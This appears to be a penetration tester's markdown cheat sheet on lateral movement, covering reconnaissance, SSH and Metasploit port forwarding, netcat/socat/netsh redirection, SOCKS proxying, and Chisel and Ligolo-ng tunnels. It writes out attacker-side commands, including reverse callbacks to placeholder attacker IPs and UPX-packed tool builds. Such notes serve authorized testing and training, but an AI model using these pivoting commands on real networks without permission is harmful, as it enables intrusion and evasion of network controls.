+++
title = "Lateral Movement"
+++

# Network Info

```bash
# Linux
arp -a
cat /etc/hosts
ifconfig
ip a
nmcli dev show
ip r

# Windows
arp -a
type c:\Windows\System32\drivers\etc\hosts
ipconfig /all
netstat -r
```

{{< embed-section page="Docs/9 - Notes/Troubleshooting" header="access-domain-names" >}}

## Domain Information

```bash
# Get Domain Info
net config workstation
ipconfig /all
echo %USERDOMAIN%
$env:USERDOMAIN
echo %LOGONSERVER%
$env:LOGONSERVER
(Get-WmiObject Win32_ComputerSystem).Domain
(Get-CimInstance Win32_ComputerSystem).Domain   # PowerShell (modern; no WMI)
systeminfo
```

# Tunneling (Port Forwarding)

## SSH

- https://www.ssh.com/academy/ssh/tunneling-example

### Forward

`Local (where SSH is ran from) => Remote (Target)`

```bash
ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<TARGET_2>

ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> \
    -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> \
    <USER>@<TARGET_2>
```

### Reverse

**NOTE:** this [requires `GatewayPorts` to be `yes`](https://www.man7.org/linux/man-pages/man5/sshd_config.5.html):
```bash
grep 'GatewayPorts' /etc/ssh/sshd_config
```

```bash
ssh -R <REMOTE_IP>:<REMOTE_PORT>:0.0.0.0:<LOCAL_PORT> <USER>@<TARGET> -v
```

## Metasploit

```bash
portfwd list
```

### Forward

```bash
# ATTACKER => REDIR => TARGET
# NOTE: add "-L 0.0.0.0" to make the local port accessible from other machines next to ATTACKER (like a Windows box)
portfwd add -l <ATTACKER_PORT> -r <TARGET_IP> -p <TARGET_PORT> 
```

### Reverse

```bash
# TARGET => REDIR => ATTACKER
portfwd add -R -l <REDIR_PORT> -L <ATTACKER_IP> -p <ATTACKER_PORT>
```

# Redirection

Redirection is simple traffic manipulation on a single host. There are no tunnels.

## Netcat

```bash
# PORT FORWARD 0.0.0.0:<LISTEN_PORT> => <TARGET>:<FORWARD_PORT>
# NOTE: use normal netcat (w/o "-e" or "-c" options)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | nc <TARGET> <FORWARD_PORT> 2>&1 | nc -lvnp <LISTEN_PORT> > /tmp/f
```

## Socat

This can be forward or reverse, with the `TARGET_*` being the ATTACKER or TARGET respectively.

```bash
socat TCP4-LISTEN:<LISTEN_PORT>,fork,reuseaddr TCP4:<TARGET_IP>:<TARGET_PORT>
```

## Netsh

- https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts

```bash
netsh.exe interface portproxy add v4tov4 listenaddress=<LISTEN_IP> listenport=<LISTEN_PORT> connectaddress=<REMOTE_IP> connectport=<REMOTE_PORT>

netsh.exe interface portproxy show v4tov4
```

# Dynamic Forwarding

## SOCKS

- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
- `sudo proxychains` is required for some (or most/all) proxied tools like `netexec`

| **Feature**             | **SOCKS4**                        | **SOCKS5**                            |
| ----------------------- | --------------------------------- | ------------------------------------- |
| **Transport Protocols** | TCP only                          | **TCP & UDP**                         |
| **Addressing**          | IPv4 Only                         | **IPv4 & IPv6**                       |
| **DNS Resolution**      | Client-side (vulnerable to leaks) | **Remote/Proxy-side** (via SOCKS5/4a) |
| **Authentication**      | None (Ident-based only)           | **Username/Password**, GSS-API        |
| **Nmap Compatibility**  | Native `--proxy` (very stable)    | Better via `proxychains`              |
| **SSH (`-D`) Default**  | Supported (manual flag)           | **Default**                           |
| **Chisel Default**      | Not standard                      | **Native / Built-in**                 |

```bash
sudo proxychains -q -f <CONFIG_FILE> <COMMAND>

sudo proxychains msfconsole

# USE nmap's builtin --proxy option
nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
# --unprivileged avoids raw sockets and "bad" packets
nmap -n -Pn -sT -sV --unprivileged --proxy socks4://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
```

### Step 0: Pre-Requisites

```bash
# Edit ProxyChains Config
# NOTE: disable strict_chain to for robustness
ls -la /etc/proxychains*.conf
cat /etc/proxychains4.conf | grep -v '^#' | grep -v '^\s*$'

---

# Chisel config
sudo tee /etc/proxychains_chisel.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF
sudo ln -sf /etc/proxychains_chisel.conf /etc/proxychains.conf

# SSH / nmap config
sudo tee /etc/proxychains_ssh.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks4 127.0.0.1 9050
EOF
sudo ln -sf /etc/proxychains_ssh.conf /etc/proxychains.conf
```

**Run all commands in proxy context:**
```bash
sudo proxychains -q -f <CONFIG_FILE> bash
```
#### Metasploit

```bash
# Set global proxy for Metasploit
setg PROXIES socks5:127.0.0.1:1080  # SOCKS5
setg PROXIES HTTP:127.0.0.1:8080  # HTTP

# Clear proxy for current module only
set Proxies ""

# Accept reverse connections directly (don't let it thru the SOCKS proxy)
setg ReverseAllowProxy true
```

### via SSH

```bash
# Step 1: create proxy via SSH
ssh -D 9050 <USER>@<TARGET>
```

### via Plink

Windows SSH client from PuTTY.
- Proxy Client: https://www.proxifier.com/

```bash
plink -ssh -D 9050 <USER>@<TARGET>

cmd.exe /c echo y | plink.exe -ssh -l <USER> -pw <PASS> <TARGET>
```

### via Metasploit

```bash
# Step 1: Run MSF SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
#set version 5
run -j
jobs

# OR Step 2a: in MSF session
run autoroute -s <TARGET_SUBNET>
run autoroute -p

# Step 2b: in MSF
#unset RHOSTS  # avoids error
run post/multi/manage/autoroute SUBNET=<SUBNET> SESSION=<SESSION>
route
```

## Sshuttle

- https://github.com/sshuttle/sshuttle

"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling `--dns`." **Works for TCP but NOT ICMP**


```bash
sudo apt install -y sshuttle
# NOTE: -x excludes the pivot IP to avoid routing issues
sudo sshuttle -r <USER>@<TARGET> --ssh-cmd "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" -x <PIVOT_IP> -v <TARGET_SUBNET>
```

## Chisel

- https://github.com/jpillora/chisel

"Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH"

**NOTE:** configure [SOCKS5 proxy w/ port 1080](#step-0-pre-requisites)

**NOTE:** in [lab environments, might require fixing Go]({{% ref "troubleshooting.md#fix-go" %}})

```bash
### LINUX
# DYNAMIC
git clone https://github.com/jpillora/chisel.git && cd chisel
# STATIC
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_static

### WINDOWS
# 64-bit
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o chisel.exe
# 32-bit
CGO_ENABLED=0 GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o chisel32.exe

### SHRINK (10MB -> 3MB)
upx --lzma chisel*
```

### Forward

```bash
# REDIR
./chisel server --socks5 -v -p <LISTEN_PORT>

# ATTACKER
./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> 1080:socks
```

### Reverse

```bash
# ATTACKER
./chisel server --socks5 --reverse -v -p <LISTEN_PORT>

# REDIR
./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> R:1080:socks
```

## Ligolo-ng

- https://docs.ligolo.ng/InstallBuild/
- https://docs.ligolo.ng/Quickstart/

Sets up a new interface and route to move traffic

**NOTE:** in [lab environments, might require fixing Go]({{% ref "troubleshooting.md#fix-go" %}})

### Build

```bash
git clone https://github.com/nicocha30/ligolo-ng.git && cd ligolo-ng

# Build for Windows
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe cmd/agent/main.go CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o proxy.exe cmd/proxy/main.go
# Build for Linux
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent cmd/agent/main.go CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o proxy cmd/proxy/main.go
### SHRINK (10MB -> 3MB)
upx --lzma agent* proxy*
```

### ATTACKER: Listener

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip addr add <MY_IP_ON_SUBNET>/24 dev ligolo  # .252
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
# sudo ip route add <SUBNET>/24 dev <INTERFACE>
```

### Target 

#### (Forward) ATTACKER connects to TARGET

```bash
# TARGET
.\agent.exe -bind 0.0.0.0:<PORT>

# ATTACKER: ligolo session
connect_agent --ip <TARGET>:<PORT>
session
tunnel_start --tun ligolo
```

#### (Reverse) TARGET calls back to ATTACKER

```bash
# Target
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry

# ATTACKER: ligolo session
session
tunnel_start --tun ligolo
```

### Tunnels

Callbacks do **not** work automatically but can be enabled via a tunnel

```bash
listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 127.0.0.1:<ATTACKER_PORT> --tcp
```
